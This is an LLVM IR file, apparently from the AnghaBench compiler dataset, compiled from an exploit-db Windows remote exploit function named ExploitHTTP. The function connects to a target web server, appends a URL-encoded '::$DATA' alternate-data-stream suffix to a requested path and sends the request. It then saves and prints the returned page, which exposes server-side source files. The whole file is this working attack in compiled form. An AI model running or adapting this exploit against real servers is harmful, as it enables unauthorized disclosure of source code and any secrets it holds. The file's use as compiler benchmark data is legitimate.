; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2690.c_ExploitHTTP.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2690.c_ExploitHTTP.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZ = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"HOST: %s\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"PORT: %i\0A\00", align 1
@httpport = common dso_local global i32 0, align 4
@INTERNET_SERVICE_HTTP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [29 x i8] c"Failed to Connect...Exiting\0A\00", align 1
@file = common dso_local global i32 0, align 4
@INTERNET_FLAG_NO_AUTH = common dso_local global i64 0, align 8
@INTERNET_FLAG_NO_AUTO_REDIRECT = common dso_local global i64 0, align 8
@INTERNET_FLAG_NO_CACHE_WRITE = common dso_local global i64 0, align 8
@INTERNET_FLAG_NO_COOKIES = common dso_local global i64 0, align 8
@INTERNET_FLAG_RELOAD = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [22 x i8] c"%3A%3A%24%44%41%54%41\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"HTTP/1.0\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"HTTP Open Request failed....Exiting\0A\00", align 1
@.str.7 = private unnamed_addr constant [37 x i8] c"HTTP Send Request failed....Exiting\0A\00", align 1
@.str.8 = private unnamed_addr constant [45 x i8] c"Exploit Sent...Dumping HTTP Return Packet...\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [37 x i8] c"Error Outputting HTTP Return Packet\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @ExploitHTTP(i32* %0, i8* %1, i8* %2) #0 {
  %4 = alloca i32*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  store i32* %0, i32** %4, align 8
  store i8* %1, i8** %5, align 8
  store i8* %2, i8** %6, align 8
  %13 = load i32, i32* @BUFSIZ, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %10, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %11, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8* %17)
  %19 = load i32, i32* @httpport, align 4
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i32 %19)
  %21 = load i32*, i32** %4, align 8
  %22 = load i8*, i8** %5, align 8
  %23 = load i32, i32* @httpport, align 4
  %24 = load i32, i32* @INTERNET_SERVICE_HTTP, align 4
  %25 = call i32* @InternetConnect(i32* %21, i8* %22, i32 %23, i32* null, i32* null, i32 %24, i32 0, i32 0)
  store i32* %25, i32** %7, align 8
  %26 = icmp eq i32* %25, null
  br i1 %26, label %27, label %34

27:                                               ; preds = %3
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0))
  %29 = load i32*, i32** %4, align 8
  %30 = call i32 @InternetCloseHandle(i32* %29)
  %31 = load i32, i32* @file, align 4
  %32 = call i32 @fclose(i32 %31)
  %33 = call i32 @exit(i32 1) #4
  unreachable

34:                                               ; preds = %3
  %35 = load i64, i64* @INTERNET_FLAG_NO_AUTH, align 8
  %36 = load i64, i64* @INTERNET_FLAG_NO_AUTO_REDIRECT, align 8
  %37 = or i64 %35, %36
  %38 = load i64, i64* @INTERNET_FLAG_NO_CACHE_WRITE, align 8
  %39 = or i64 %37, %38
  %40 = load i64, i64* @INTERNET_FLAG_NO_COOKIES, align 8
  %41 = or i64 %39, %40
  %42 = load i64, i64* @INTERNET_FLAG_RELOAD, align 8
  %43 = or i64 %41, %42
  store i64 %43, i64* %9, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = call i32 @strcat(i8* %44, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %46 = load i32*, i32** %7, align 8
  %47 = load i8*, i8** %6, align 8
  %48 = load i64, i64* %9, align 8
  %49 = call i32* @HttpOpenRequest(i32* %46, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i8* %47, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i32* null, i32* null, i64 %48, i32 0)
  store i32* %49, i32** %8, align 8
  %50 = load i32*, i32** %8, align 8
  %51 = icmp eq i32* %50, null
  br i1 %51, label %52, label %61

52:                                               ; preds = %34
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0))
  %54 = load i32*, i32** %7, align 8
  %55 = call i32 @InternetCloseHandle(i32* %54)
  %56 = load i32*, i32** %4, align 8
  %57 = call i32 @InternetCloseHandle(i32* %56)
  %58 = load i32, i32* @file, align 4
  %59 = call i32 @fclose(i32 %58)
  %60 = call i32 @exit(i32 1) #4
  unreachable

61:                                               ; preds = %34
  %62 = load i32*, i32** %8, align 8
  %63 = call i32 @HttpSendRequest(i32* %62, i32* null, i32 0, i32* null, i32 0)
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %76, label %65

65:                                               ; preds = %61
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.7, i64 0, i64 0))
  %67 = load i32*, i32** %8, align 8
  %68 = call i32 @InternetCloseHandle(i32* %67)
  %69 = load i32*, i32** %7, align 8
  %70 = call i32 @InternetCloseHandle(i32* %69)
  %71 = load i32*, i32** %4, align 8
  %72 = call i32 @InternetCloseHandle(i32* %71)
  %73 = load i32, i32* @file, align 4
  %74 = call i32 @fclose(i32 %73)
  %75 = call i32 @exit(i32 1) #4
  unreachable

76:                                               ; preds = %61
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.8, i64 0, i64 0))
  %78 = call i32 @sleep(i32 1000)
  br label %79

79:                                               ; preds = %99, %76
  %80 = load i32*, i32** %8, align 8
  %81 = trunc i64 %14 to i32
  %82 = call i64 @InternetReadFile(i32* %80, i8* %16, i32 %81, i64* %12)
  %83 = icmp ne i64 %82, 0
  br i1 %83, label %84, label %87

84:                                               ; preds = %79
  %85 = load i64, i64* %12, align 8
  %86 = icmp ugt i64 %85, 0
  br label %87

87:                                               ; preds = %84, %79
  %88 = phi i1 [ false, %79 ], [ %86, %84 ]
  br i1 %88, label %89, label %100

89:                                               ; preds = %87
  %90 = load i64, i64* %12, align 8
  %91 = load i32, i32* @file, align 4
  %92 = call i32 @fwrite(i8* %16, i64 %90, i32 1, i32 %91)
  %93 = load i64, i64* %12, align 8
  %94 = load i32, i32* @stdout, align 4
  %95 = call i32 @fwrite(i8* %16, i64 %93, i32 1, i32 %94)
  %96 = icmp slt i32 %95, 1
  br i1 %96, label %97, label %99

97:                                               ; preds = %89
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0))
  br label %99

99:                                               ; preds = %97, %89
  br label %79

100:                                              ; preds = %87
  %101 = load i32*, i32** %8, align 8
  %102 = call i32 @InternetCloseHandle(i32* %101)
  %103 = load i32*, i32** %7, align 8
  %104 = call i32 @InternetCloseHandle(i32* %103)
  %105 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %105)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32* @InternetConnect(i32*, i8*, i32, i32*, i32*, i32, i32, i32) #2

declare dso_local i32 @InternetCloseHandle(i32*) #2

declare dso_local i32 @fclose(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32* @HttpOpenRequest(i32*, i8*, i8*, i8*, i32*, i32*, i64, i32) #2

declare dso_local i32 @HttpSendRequest(i32*, i32*, i32, i32*, i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i64 @InternetReadFile(i32*, i8*, i32, i64*) #2

declare dso_local i32 @fwrite(i8*, i64, i32, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
